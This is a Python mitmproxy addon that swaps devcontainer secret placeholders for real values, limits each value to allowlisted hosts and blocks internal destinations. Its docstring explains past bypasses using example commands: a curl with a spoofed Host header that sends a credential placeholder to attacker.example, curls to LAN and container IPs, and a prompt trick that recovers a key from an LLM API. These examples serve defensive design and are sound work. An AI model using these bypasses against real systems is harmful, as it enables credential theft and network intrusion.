"""
desolate-proxy: transparent secret-substitution addon for mitmproxy.

Config lives at /etc/desolate-proxy/settings.json (override with DESOLATE_SETTINGS).
Secrets are keyed by their PLACEHOLDER NAME, which is exactly the string your
devcontainers put in .env files:

    .env inside devcontainer:   OPENAI_API_KEY=MY-AWESOME-PROJECT-OPENAI-KEY
    settings.json in the VM:    "MY-AWESOME-PROJECT-OPENAI-KEY":
                                    {"value": "sk-...", "hosts": ["api.openai.com"]}

Behavior per request:
  0. Refuse any request whose destination ADDRESS is internal (see below).
  1. Establish the PROVEN destination (see below).
  2. Network policy (ordered allow/deny rules, first match wins), on the proven
     name WHERE THERE IS ONE. Plaintext has none, so that path falls back to
     the Host header and the policy is only as good as a name the client chose
     -- see "WHAT THE NETWORK POLICY DOES NOT DECIDE" below.
  3. Scan URL + headers + body for any configured placeholder. One kind of
     entry is scanned for more narrowly -- see "THE SELF-TEST FIXTURE" below.
  4. If a placeholder is found but the proven destination is NOT in that
     secret's allowlist -> block 403 (leak detection / honeypot defense).
     Unlike step 2 this NEVER falls back: no SNI means no substitution.
  5. Otherwise substitute every occurrence with the real value.
  6. On responses, scrub real values back to placeholders, so an endpoint that
     echoes a secret VERBATIM does not hand it to the container -- see "WHAT
     SCRUBBING IS, AND WHAT IT IS NOT" below for how far that goes.

Bodies are read DECODED, in both directions, at any size -- see `decoded_body`
and the note beside SETTINGS_PATH. Searching the encoded bytes found nothing in
a gzipped message, which is most of them, and a size cap turned the largest
responses into the ones that went unscrubbed.

Redirect safety falls out of the model: substitution is decided per-request,
so a redirect to an unlisted host receives the placeholder, which trips rule 4.

---------------------------------------------------------------------------
WHY "PROVEN DESTINATION" AND NOT THE HOST HEADER
---------------------------------------------------------------------------
mitmproxy's `request.pretty_host` prefers the Host header, which the CLIENT
sends. In transparent mode the client also chooses the IP it connects to, and
those two are independent. Deciding on the Host header was therefore a total
bypass of this whole design, over plain HTTP *and* over TLS:

    curl http://attacker.example/  -H 'Host: api.openai.com' \
                                   -H 'Authorization: Bearer MYAPP-OPENAI-KEY'

The addon saw "api.openai.com", found it allowlisted, substituted the real key
-- and mitmproxy delivered it to the original destination, i.e. the attacker.
Any code in any devcontainer could harvest every configured secret this way.

So the destination is taken from the TLS SNI, which is bound to the connection
that will actually carry the request, and the Host header must MATCH it. An
attacker who instead sets SNI=api.openai.com toward their own IP cannot
complete the handshake: mitmproxy verifies the upstream certificate against
that name.

Plain HTTP has no SNI and therefore no provable destination at all. Requests
that carry a placeholder over plaintext are refused rather than guessed at.

---------------------------------------------------------------------------
WHAT THE NETWORK POLICY DOES NOT DECIDE
---------------------------------------------------------------------------
Everything above is about SECRETS, and holds. The `network` rules are a
separate list with a weaker guarantee, and the difference is worth stating
where someone turning them on will read it.

They match on a NAME, and plaintext has no proven one -- so `_request` judges
plaintext on the Host header. With `default_action: "deny"`, a container
therefore still reaches any PUBLIC address on :80 by claiming an allowlisted
name it does not control:

    curl http://<any-public-ip>/ -H 'Host: deb.debian.org'

Bounded on both sides: no secret can ride that path (step 4 above has no
fallback, so a placeholder over plaintext is 403 whatever the Host says), and
no internal address can (the address check below runs first, and the kernel
runs behind it). What is NOT bounded is the destination set for ordinary
plaintext traffic. Judging plaintext on `request.host` -- which IS the original
destination in transparent mode -- would close it, at the cost of denying
every plaintext request in a deny-by-default deployment unless the allowlist
carries addresses as well as names. Pinned by
tests/unit/proxy/test_addon.py::test_the_network_allowlist_is_spoofable_over_plaintext.

---------------------------------------------------------------------------
WHAT SCRUBBING IS, AND WHAT IT IS NOT
---------------------------------------------------------------------------
Step 6 matches the value EXACTLY, which covers the two cases worth covering: an
endpoint that echoes a credential by accident, and the cheap deliberate path --
substitution rewrites request BODIES, so a container can store the placeholder
through an allowlisted API and have the real value written down server-side.
Reading it back returns the placeholder, and that path is closed.

It is not a boundary, because an exact match is all it is. An allowlisted host
that can TRANSFORM its input defeats it in one request:

    {"prompt": "reverse this: MYAPP-OPENAI-KEY"}
      -> the model is handed the real key and answers with it reversed
      -> nothing matches, nothing is scrubbed, the container reverses it back

Any secret allowlisted to a service that computes on what you send it -- every
LLM API -- is therefore recoverable by a compromised container. This is a
property of substitution itself, not a defect in the scrubber, and no amount of
work here fixes it. What survives is the BOUND: the real value can only ever be
sent to that secret's allowlisted hosts. Bounding where a secret goes is the
guarantee; keeping it unknown to a compromised container is not.

---------------------------------------------------------------------------
WHY INTERNAL DESTINATIONS ARE REFUSED BEFORE ANYTHING ELSE
---------------------------------------------------------------------------
nftables REDIRECTs every :80 and :443 from the container bridges here,
whatever the destination address was. This proxy then dials that destination
from the VM -- where the source is no longer a container bridge, so neither
the forward default-deny nor the input drop applies to it. That makes this
process a confused deputy: the one component standing on both sides of the
containment boundary.

    curl http://192.168.5.2/     # the Mac, over Colima's vmnet
    curl http://172.17.0.2/      # a container on another docker bridge

Both were redirected here and both were forwarded, because the network policy
matches on a NAME (fnmatch) and the shipped default is {"host": "*"} -- which
an IP literal matches. A name check cannot fix this on its own either: a
public hostname whose A record points at 127.0.0.1 or 10.x satisfies any
allowlist (DNS rebinding). So the check below is on the ADDRESS, and it runs
before the name is consulted at all.

It is NOT the whole wall. `tls_passthrough` entries are tunnelled from
`tls_clienthello` and never reach `request()`, so they never reach this check
either -- and the SNI they match on is chosen by the client. Every glob added
to `tls_passthrough` is a hole in this check, not just in interception.

Set "allow_private_destinations": true in settings.json only if you are
deliberately proxying to something on the LAN, and understand that it removes
the wall for :80/:443.

That flag is no longer sufficient on its own, and this is deliberate. The
check below is the INNER layer; the outer one is the `output` chain in
nftables-desolate.conf, which drops private destinations from this process's
uid in the kernel. It exists because there are three ways for the check below
to be absent -- connection_strategy=eager dials before `request()` runs,
`tls_passthrough` never reaches `request()` at all, and an addon that fails to
load enforces nothing -- and none of them are visible to the kernel. So
proxying to the LAN on purpose means changing BOTH: this flag, and that chain.
A flag that silently does nothing is worse than one that is missing, which is
why it is written down here rather than discovered from a timeout.

---------------------------------------------------------------------------
WHAT MAKES A SECRET'S CONFIGURATION USABLE AT ALL
---------------------------------------------------------------------------
Two properties of a `secrets` entry are load-bearing, and both fail quietly.
They are checked when settings.json is read, and a secret that fails either is
DROPPED -- which is the safe direction: an unknown placeholder is substituted
nowhere, so it travels as itself and no value can leave.

  * Every entry in `hosts` must PIN a destination. "*" is not an allowlist,
    it is the absence of one spelled so it looks deliberate, and it turns the
    placeholder back into a bearer token that any container may post
    anywhere. Wildcards are accepted only where a TLS certificate accepts
    them: one leading label, over a name with at least two literal labels of
    its own. So "*.openai.com" is fine, while "*", "*.com" and "*openai.com"
    are not -- fnmatch's "*" does not stop at a dot, so that last one also
    matches "evilopenai.com".

  * No placeholder name may contain another. Substitution is a plain string
    replace and detection a plain substring search, so with MY_KEY and
    MY_KEY2 both configured, a request carrying MY_KEY2 is judged against
    MY_KEY's allowlist and receives MY_KEY's value with a stray "2" left
    glued to it. A minimum name LENGTH used to stand in for this check; it
    never prevented the thing it was named for.

---------------------------------------------------------------------------
THE SELF-TEST FIXTURE, AND WHY IT IS MATCHED DIFFERENTLY
---------------------------------------------------------------------------
`preflight.sh` proves leak detection is actually running by tripping it: it
sends a placeholder toward a host that placeholder is not allowlisted for and
demands a 403. That needs a placeholder to exist, so one ships in
settings.example.json -- DESOLATE-SELFTEST-PLACEHOLDER, fake value, pinned to
httpbin.org.

An entry marked `"selftest": true` is matched ONLY as the complete value of a
request header. Not in the URL, not in the body, not as a substring of a
longer header. It is also never scrubbed out of responses.

That narrowing exists because this placeholder is the one whose NAME is a
published string. It appears in settings.example.json, in install.sh, in
preflight.sh, in this file, in the test suite and in the README -- so it turns
up in ordinary traffic that has nothing to do with secrets, and under the
normal substring rule every one of those is a 403 toward any host but
httpbin.org:

    git push          # the repo's own blobs carry the name
    an agent editing this repo, sending a diff to its model API
    pasting preflight output into an issue tracker

Each of those got refused with "secret DESOLATE-SELFTEST-PLACEHOLDER is not
permitted for host ...", which is true, useless, and indistinguishable from a
real exfiltration attempt. The escape was to delete the fixture -- which is
what made preflight start reporting `secrets can be exfiltrated` against a
perfectly healthy addon, because the probes only match CONFIGURED placeholders.
The fixture being deletable and the fixture being poisonous were the same bug
wearing two faces.

A whole header value is the discriminator because that is exactly what the
probes send (`-H "X-Exfil: DESOLATE-SELFTEST-PLACEHOLDER"`) and it is not a
shape that prose, a diff or a git object ever takes. Both probes still trip,
for the same reasons they always did.

This narrows detection, so it is worth being explicit about what it does NOT
cost. `selftest` is opt-in per entry and nothing sets it but the shipped
fixture. The value it guards is fake, so there is no secret whose bound is
loosened -- the guarantee this file exists to keep ("a real value reaches only
its allowlisted hosts") is untouched, because a real secret carries no such
flag and is matched everywhere it can appear, as before. Do not set it on
anything real: it would mean a secret in a body or a URL travels unnoticed.
"""

import fnmatch
import ipaddress
import json
import logging
import os
import re

from mitmproxy import http

SETTINGS_PATH = os.environ.get("DESOLATE_SETTINGS", "/etc/desolate-proxy/settings.json")

# There is deliberately NO size cap on body inspection.
#
# A 5 MiB cap used to skip larger bodies, and it read as a memory guard without
# being one: streaming is not enabled, so mitmproxy has already buffered the
# whole body before these hooks run. Declining to LOOK at it freed nothing and
# skipped the scrub on exactly the responses most likely to be carrying bulk
# data. The cost of removing it is that a body is decoded before it is
# searched, so a highly-compressed one is expanded in the proxy; that is the
# accepted price of being able to see what is in it at all.

GLOB_META = re.compile(r"[*?\[\]]")
# "*." followed by two or more literal labels -- the one wildcard shape a TLS
# certificate would also accept. See the header.
PINNED_WILDCARD = re.compile(r"\*\.(?:[^*?\[\]./]+\.)+[^*?\[\]./]+\Z")


def host_pattern_problem(pattern):
    """Why this `hosts` entry cannot pin a destination, or None if it can.

    Only the SECRET allowlist goes through here. The `network` rules are a
    different list with a different job -- they decide reachability, where a
    deliberate "*" is the shipped default and means "the path is default-deny,
    the destination set is not".
    """
    if not isinstance(pattern, str) or not pattern.strip():
        return "is empty"
    if not GLOB_META.search(pattern):
        return None                      # a literal name pins itself
    if PINNED_WILDCARD.fullmatch(pattern):
        return None
    if not GLOB_META.sub("", pattern).strip("."):
        return ("matches every host, so this secret would have no allowlist at "
                "all -- name the hosts it may be sent to")
    return ("puts a wildcard somewhere it cannot be trusted: only "
            "'*.<name>.<tld>' is accepted, because '*' does not stop at a dot "
            "('*foo.com' also matches 'evilfoo.com', and '*.com' is a whole TLD)")

# stdlib logging, not ctx.log: ctx.log is deprecated and its removal would raise
# inside the request hook -- and mitmproxy answers an addon exception by letting
# the request through. That fail-open is exactly what this file must not do.
log = logging.getLogger("desolate-proxy")


class DesolateProxy:
    def __init__(self):
        self._mtime = None
        self.secrets = {}          # placeholder -> {"value": str, "hosts": [glob...]}
        self.network = []          # [{"action","host","method"?}, ...]
        self.default_action = "allow"
        self.scrub_responses = True
        self.tls_passthrough = []  # SNI globs to tunnel without interception
        self.allow_private_destinations = False

    # ---------- config ----------

    def _maybe_reload(self):
        try:
            mtime = os.stat(SETTINGS_PATH).st_mtime
        except FileNotFoundError:
            if self._mtime is not None:
                log.error(f"settings file missing: {SETTINGS_PATH}; keeping last config")
            return
        if mtime == self._mtime:
            return
        try:
            with open(SETTINGS_PATH) as f:
                cfg = json.load(f)
        except (json.JSONDecodeError, OSError) as e:
            log.error(f"failed to load {SETTINGS_PATH}: {e}; keeping last config")
            return

        secrets = {}
        for name, entry in cfg.get("secrets", {}).items():
            value = entry.get("value", "")
            hosts = entry.get("hosts", [])
            if not value:
                log.warning(f"secret {name!r} has empty value; skipping")
                continue
            if not hosts:
                log.warning(f"secret {name!r} has no hosts allowlist; skipping (refusing wildcard-by-omission)")
                continue
            problems = [(h, p) for h in hosts if (p := host_pattern_problem(h))]
            if problems:
                for host, problem in problems:
                    log.error(f"secret {name!r}: host {host!r} {problem}")
                log.warning(f"secret {name!r} skipping (its allowlist does not pin a destination)")
                continue
            secrets[name] = {"value": value, "hosts": [h.lower() for h in hosts],
                             "selftest": bool(entry.get("selftest", False))}

        for name in self._overlapping(secrets):
            del secrets[name]

        self.secrets = secrets
        self.network = cfg.get("network", [])
        self.default_action = cfg.get("default_action", "allow")
        self.scrub_responses = cfg.get("scrub_responses", True)
        self.tls_passthrough = [h.lower() for h in cfg.get("tls_passthrough", [])]
        self.allow_private_destinations = bool(cfg.get("allow_private_destinations", False))
        self._mtime = mtime
        log.info(f"loaded {len(self.secrets)} secret(s), {len(self.network)} network rule(s), "
                 f"default_action={self.default_action}, "
                 f"allow_private_destinations={self.allow_private_destinations}")

    # ---------- helpers ----------

    @staticmethod
    def _overlapping(secrets):
        """Placeholder names that contain, or are contained by, another one.

        Both members of a colliding pair are returned, never just one: keeping
        the longer would quietly change which secret a request is judged
        against, and this file's whole job is to make that decision legible.

        A minimum name length was the previous defence, and it does not
        actually defend: MYAPP-OPENAI-KEY and MYAPP-OPENAI-KEY-2 clear any
        length bar and still collide. See the module header for what the
        collision does to a request.
        """
        names = sorted(secrets)
        overlapping = set()
        for index, name in enumerate(names):
            for other in names[index + 1:]:
                if name in other or other in name:
                    log.error(f"placeholders {name!r} and {other!r} overlap (one contains "
                              f"the other), so neither can be substituted unambiguously; "
                              f"dropping both -- rename one")
                    overlapping.update((name, other))
        return overlapping

    @staticmethod
    def _host_matches(host, patterns):
        host = (host or "").lower()
        return any(fnmatch.fnmatch(host, p) for p in patterns)

    @staticmethod
    def proven_host(flow):
        """The destination this connection can be PROVEN to be talking to.

        The TLS SNI, and only the TLS SNI. It is bound to the handshake that
        mitmproxy validates the upstream certificate against, so a client
        cannot claim a name it does not control. Returns None for plaintext
        HTTP, where no such proof exists.
        """
        sni = getattr(flow.client_conn, "sni", None)
        return sni.lower() if sni else None

    @staticmethod
    def destination_address(flow):
        """The address this connection actually goes to, or None if not an IP.

        Ordered, and the FIRST thing that parses as an IP literal wins. In
        transparent mode `request.host` IS the original destination for
        plaintext, which is the case that matters most; for TLS mitmproxy fills
        it from the SNI instead, so that falls through to the connection's own
        addresses. Anything that does not parse is a name, not a destination we
        can judge here, and is skipped rather than guessed at.
        """
        candidates = [getattr(flow.request, "host", None)]
        conn = getattr(flow, "server_conn", None)
        for attribute in ("peername", "address"):
            value = getattr(conn, attribute, None) if conn is not None else None
            if isinstance(value, (tuple, list)) and value:
                candidates.append(value[0])

        for candidate in candidates:
            if not isinstance(candidate, str) or not candidate:
                continue
            try:
                return ipaddress.ip_address(candidate.strip("[]"))
            except ValueError:
                continue
        return None

    def audit(self, flow, verdict, host, route, method, secrets):
        """One machine-readable line per request, for `cli.sh proxy audit`.

        Separate from the human log lines above on purpose. Those are prose and
        change freely; this is parsed by a shell script on the Mac, so it is a
        fixed field order with a stable prefix.

        NEVER a query string, and NEVER a secret VALUE -- only names. The
        request URL is attacker-influenced and a query string is exactly where a
        token would sit, so `route` arrives already stripped by the caller. The
        whole point of substitution is that a real value exists in one 0600 file
        on this VM; writing one into journald would quietly make that false.
        """
        try:
            log.info(
                "AUDIT "
                f"verdict={verdict} "
                f"method={method} "
                f"host={host or '?'} "
                f"path={route or '/'} "
                f"secrets={','.join(secrets) if secrets else '-'}"
            )
        except Exception:
            # An audit line must never be the reason a request fails.
            pass

    @staticmethod
    def is_internal(address):
        """Whether a container must never be able to reach this address.

        `not is_global` is the primary test, and it is the primary test on
        purpose. The obvious alternative -- `is_private or is_loopback or ...`
        -- misses RFC 6598 shared address space (100.64.0.0/10), which CPython
        does not classify as private. That range is where a tailnet lives, so
        on any host running Tailscale it is the LAN, and leaving it out would
        forward exactly the traffic this check exists to refuse.

        The explicit terms are kept alongside it for two reasons: multicast is
        `is_global == True` under that definition and still must not be
        reachable, and the meaning of these predicates has moved across CPython
        releases (both shared space and IPv4-mapped addresses have changed
        classification). Stating the boundary rather than inheriting it keeps it
        from shifting under the interpreter in the venv.
        """
        if address is None:
            return False
        # ::ffff:192.168.5.2 is 192.168.5.2 in another spelling. Judge the host,
        # not the encoding.
        mapped = getattr(address, "ipv4_mapped", None)
        if mapped is not None:
            address = mapped
        return (not address.is_global
                or address.is_private or address.is_loopback
                or address.is_link_local or address.is_multicast
                or address.is_reserved or address.is_unspecified)

    @staticmethod
    def host_header(flow):
        """The Host / :authority the client CLAIMED, minus any port. Untrusted."""
        raw = flow.request.host_header
        if not raw:
            return None
        raw = raw.strip()
        if raw.startswith("["):                 # [::1]:443
            return raw.split("]", 1)[0][1:].lower()
        if raw.count(":") == 1:                 # host:port (never a bare IPv6)
            raw = raw.rsplit(":", 1)[0]
        return raw.lower()

    def _network_allowed(self, host, method):
        for rule in self.network:
            if not self._host_matches(host, [str(rule.get("host", "*")).lower()]):
                continue
            m = rule.get("method")
            if m and m.upper() != method.upper():
                continue
            return rule.get("action", "deny") == "allow"
        return self.default_action == "allow"

    @staticmethod
    def _block(flow, code, msg):
        flow.response = http.Response.make(
            code, f"desolate-proxy: {msg}\n".encode(), {"content-type": "text/plain"}
        )

    @staticmethod
    def decoded_body(message):
        """The body as its peer will read it, whatever Content-Encoding says.

        `raw_content` is the body still in its encoding, so searching it for a
        plaintext secret finds nothing in any gzipped message -- which is most
        of them. Reading `.content` decodes; assigning it re-encodes and fixes
        up Content-Length, so a body leaves in the encoding it arrived in.

        Raises ValueError when the body cannot be decoded, and every caller
        runs inside a hook that answers an exception by blocking. That is the
        point: "we could not read this body" must never be taken for "this body
        holds no secret".
        """
        return message.content or b""

    def _placeholders_in_request(self, flow):
        """Return the set of configured placeholder names present in the request.

        "Present" means anywhere -- URL, headers or body -- for every real
        secret. A `selftest` entry is matched only as the complete value of a
        header; see "THE SELF-TEST FIXTURE" in the module header for why one
        entry gets a narrower rule and what that does not cost.
        """
        if not self.secrets:
            return set()
        # .get, not [] -- an entry reaching here is normally one _maybe_reload
        # built, but nothing enforces that and a missing flag must read as
        # "an ordinary secret", which is the conservative direction: matched
        # everywhere rather than only in a header.
        header_values = [v.strip() for _, v in flow.request.headers.items(multi=True)]
        found = {name for name, entry in self.secrets.items()
                 if entry.get("selftest") and name in header_values}

        real = [name for name, entry in self.secrets.items() if not entry.get("selftest")]
        if not real:
            return found
        url = flow.request.url
        header_blob = "\n".join(f"{k}: {v}" for k, v in flow.request.headers.items(multi=True))
        # Decoded, and decoded HERE rather than above: a body that cannot be
        # read must fail closed (decoded_body raises, request() blocks), and
        # that is a promise about real secrets. Reaching it for a store holding
        # nothing but the fake fixture would refuse requests to protect a value
        # that does not exist.
        body = self.decoded_body(flow.request)
        found.update(name for name in real
                     if name in url or name in header_blob or name.encode() in body)
        return found

    # ---------- mitmproxy hooks ----------

    def tls_clienthello(self, data):
        try:
            self._maybe_reload()
            sni = (data.client_hello.sni or "").lower()
            if sni and self._host_matches(sni, self.tls_passthrough):
                data.ignore_connection = True  # tunnel raw; no interception, no substitution
        except Exception:
            log.exception("tls_clienthello failed; not passing through")

    def request(self, flow: http.HTTPFlow):
        # Everything below is wrapped: mitmproxy responds to an uncaught addon
        # exception by forwarding the request unmodified, which would silently
        # disable secret policy while traffic keeps flowing. Fail closed.
        try:
            self._request(flow)
        except Exception:
            log.exception("desolate-proxy addon error; blocking request (fail-closed)")
            self._block(flow, 502, "internal policy error; request refused")

    def _request(self, flow: http.HTTPFlow):
        self._maybe_reload()
        method = flow.request.method
        proven = self.proven_host(flow)
        claimed = self.host_header(flow)

        # 0) destination address -- BEFORE the name is consulted, because the
        # name is the part an attacker chooses. See the module header.
        if not self.allow_private_destinations:
            destination = self.destination_address(flow)
            if self.is_internal(destination):
                log.warning(f"DENY  {method} -> {destination} (internal destination; "
                            f"claimed {claimed!r}, sni {proven!r})")
                self.audit(flow, "DENY-INTERNAL", str(destination),
                           flow.request.path.split("?", 1)[0], method, [])
                self._block(flow, 403,
                            f"destination {destination} is internal to the host; "
                            f"containers may not reach it through this proxy")
                return

        # 1) network policy -- on the proven name where we have one.
        policy_host = proven or claimed or flow.request.host
        if not self._network_allowed(policy_host, method):
            log.warning(f"DENY  {method} {policy_host}{flow.request.path} (network policy)")
            self.audit(flow, "DENY-POLICY", policy_host,
                       flow.request.path.split("?", 1)[0], method, [])
            self._block(flow, 403, f"network policy denied {method} {policy_host}")
            return

        # 2) leak detection -- strictly on the proven name.
        found = self._placeholders_in_request(flow)
        if found:
            if proven is None:
                log.warning(f"LEAK  placeholder(s) {sorted(found)} sent over PLAINTEXT to "
                            f"{flow.request.host!r} (claimed {claimed!r}) -- blocked")
                self._block(flow, 403,
                            f"secret {sorted(found)} may not be sent over plaintext HTTP "
                            f"(no verifiable destination); use https")
                return
            if claimed is not None and claimed != proven:
                log.warning(f"LEAK  Host header {claimed!r} does not match TLS SNI {proven!r} "
                            f"while carrying {sorted(found)} -- blocked")
                self._block(flow, 403,
                            f"Host header '{claimed}' does not match the TLS destination "
                            f"'{proven}'; refusing to substitute a secret")
                return
            for name in sorted(found):
                if not self._host_matches(proven, self.secrets[name]["hosts"]):
                    log.warning(f"LEAK  placeholder {name!r} sent toward {proven!r} "
                                f"(allowed: {self.secrets[name]['hosts']}) -- blocked")
                    self._block(flow, 403, f"secret {name} is not permitted for host {proven}")
                    return

        # Captured BEFORE substitution and stripped of its query string, for the
        # audit line and the SUBST log below. See the comment at the log call.
        route = flow.request.path.split("?", 1)[0]

        # 3) substitution. Order does not matter here, and that is a property
        # the config check buys: no loaded placeholder contains another (see
        # _overlapping), so no replacement can land inside a different one.
        #
        # The body is decoded once, substituted into for every secret, and
        # written back once. Assigning `.content` per secret would re-encode
        # the whole body and rewrite Content-Length once per name.
        body = self.decoded_body(flow.request) if found else b""
        substituted = body
        for name in found:
            value = self.secrets[name]["value"]
            # .path, NOT .url -- and this is load-bearing, not style.
            #
            # Assigning flow.request.url re-parses it into scheme/host/port/path
            # and, as a side effect, REWRITES THE HOST HEADER to whatever host
            # the URL names. In transparent mode request.host is the destination
            # IP, so `request.url = request.url` -- a byte-identical assignment,
            # which is what this was when the placeholder lived in a header
            # rather than the URL -- silently replaced `Host: api.openai.com`
            # with `Host: 162.159.140.245`. The upstream CDN then has no idea
            # which site is being addressed and answers with an HTML 403 that
            # mentions neither the header nor us.
            #
            # It only bit once a secret was actually registered, because this
            # loop does not run otherwise: without the secret the request went
            # out intact and returned a truthful 401.
            #
            # request.path covers path AND query string, which is the only part
            # of a URL a placeholder can realistically appear in, and assigning
            # it leaves host and headers alone.
            if name in flow.request.path:
                flow.request.path = flow.request.path.replace(name, value)
            for k, v in list(flow.request.headers.items(multi=True)):
                if name in v:
                    flow.request.headers[k] = v.replace(name, value)
            if name.encode() in substituted:
                substituted = substituted.replace(name.encode(), value.encode())

        if substituted is not body:
            flow.request.content = substituted

        if found:
            # `route` was captured BEFORE the loop above and has its query string
            # stripped. Both halves matter: `flow.request.path` covers path AND
            # query, and the substitution has already run by the time we get
            # here -- so logging it would write the REAL secret value into the
            # journal for any placeholder that appeared in a query string.
            # Secrets are supposed to exist in exactly one place on this VM,
            # 0600 in /etc/desolate-proxy/settings.json, and journald is not it.
            log.info(f"SUBST {method} {proven}{route} <- {sorted(found)}")
            self.audit(flow, "SUBST", proven, route, method, sorted(found))
        else:
            self.audit(flow, "ALLOW", proven or claimed, route, method, [])

    def response(self, flow: http.HTTPFlow):
        try:
            self._response(flow)
        except Exception:
            # A scrub failure must not leak the response through unscrubbed.
            log.exception("desolate-proxy response scrub failed; blocking response (fail-closed)")
            self._block(flow, 502, "internal policy error; response withheld")

    def _response(self, flow: http.HTTPFlow):
        if not self.scrub_responses or not flow.response or not self.secrets:
            return
        # Decoded once, scrubbed for every secret, written back once -- see the
        # matching note on the request side. Reading `.content` per secret also
        # costs more than it looks: mitmproxy's decode cache holds ONE entry and
        # confirms a hit by comparing the whole encoded body.
        body = self.decoded_body(flow.response)
        scrubbed = body
        for name, entry in self.secrets.items():
            # The fixture's value is fake and published, so there is nothing to
            # scrub -- and rewriting it to the placeholder NAME would plant that
            # name in a body the container then sends back, which is a 403 on
            # the next request. See "THE SELF-TEST FIXTURE" in the header.
            if entry.get("selftest"):
                continue
            value, bvalue = entry["value"], entry["value"].encode()
            for k, v in list(flow.response.headers.items(multi=True)):
                if value in v:
                    flow.response.headers[k] = v.replace(value, name)
            if bvalue in scrubbed:
                scrubbed = scrubbed.replace(bvalue, name.encode())
                log.warning(f"SCRUB response from {flow.request.pretty_host} echoed secret "
                            f"{name!r}; replaced with placeholder")

        if scrubbed is not body:
            flow.response.content = scrubbed


addons = [DesolateProxy()]
